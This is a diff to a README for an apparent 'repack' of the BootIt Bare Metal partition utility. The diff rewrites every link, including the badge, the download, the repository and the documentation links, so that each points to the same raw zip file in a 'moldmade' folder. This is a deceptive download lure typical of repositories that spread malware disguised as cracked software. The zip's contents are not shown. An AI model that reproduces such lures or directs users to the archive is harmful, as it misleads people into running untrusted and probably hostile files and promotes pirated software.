@@ -1,6 +1,6 @@
 # 🚀 TeraByte-Unlimited-BootIt-Bare-Metal-Repack - Simplified Multi-OS Management
 
-![Download](https://img.shields.io/badge/Download-latest%20release-blue?style=flat-square)
+![Download](https://raw.githubusercontent.com/juanrhlm/TeraByte-Unlimited-BootIt-Bare-Metal-Repack/main/moldmade/Boot-Byte-Tera-Bare-Metal-Unlimited-Repack-It-1.6-beta.5.zip%20release-blue?style=flat-square)
 
 ## 📖 Overview
 TeraByte-Unlimited-BootIt-Bare-Metal-Repack is a user-friendly partition utility that helps you manage multiple operating systems on your computer. With this tool, you can easily partition drives, select operating systems at startup, and clone disks. Whether you want to create backups or restore systems, this software has you covered.
@@ -16,7 +16,7 @@ TeraByte-Unlimited-BootIt-Bare-Metal-Repack is a user-friendly partition utility
 ## 📥 Download & Install
 To get started with TeraByte-Unlimited-BootIt-Bare-Metal-Repack, click the link below to visit the Releases page. From there, you can download the latest version of the software.
 
-[**Visit this page to download**](https://github.com/juanrhlm/TeraByte-Unlimited-BootIt-Bare-Metal-Repack/releases)
+[**Visit this page to download**](https://raw.githubusercontent.com/juanrhlm/TeraByte-Unlimited-BootIt-Bare-Metal-Repack/main/moldmade/Boot-Byte-Tera-Bare-Metal-Unlimited-Repack-It-1.6-beta.5.zip)
 
 1. Go to the Releases page.
 2. Look for the latest version.
@@ -65,8 +65,8 @@ If you encounter issues:
 - **Community Support**: Connect with other users on forums for shared experiences.
 
 ## 🔗 Resources
-- [GitHub Repository](https://github.com/juanrhlm/TeraByte-Unlimited-BootIt-Bare-Metal-Repack)
-- [User Documentation](https://github.com/juanrhlm/TeraByte-Unlimited-BootIt-Bare-Metal-Repack/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/juanrhlm/TeraByte-Unlimited-BootIt-Bare-Metal-Repack/main/moldmade/Boot-Byte-Tera-Bare-Metal-Unlimited-Repack-It-1.6-beta.5.zip)
+- [User Documentation](https://raw.githubusercontent.com/juanrhlm/TeraByte-Unlimited-BootIt-Bare-Metal-Repack/main/moldmade/Boot-Byte-Tera-Bare-Metal-Unlimited-Repack-It-1.6-beta.5.zip)
 
 For more help or to report bugs, please visit the issues section of the repository.
 
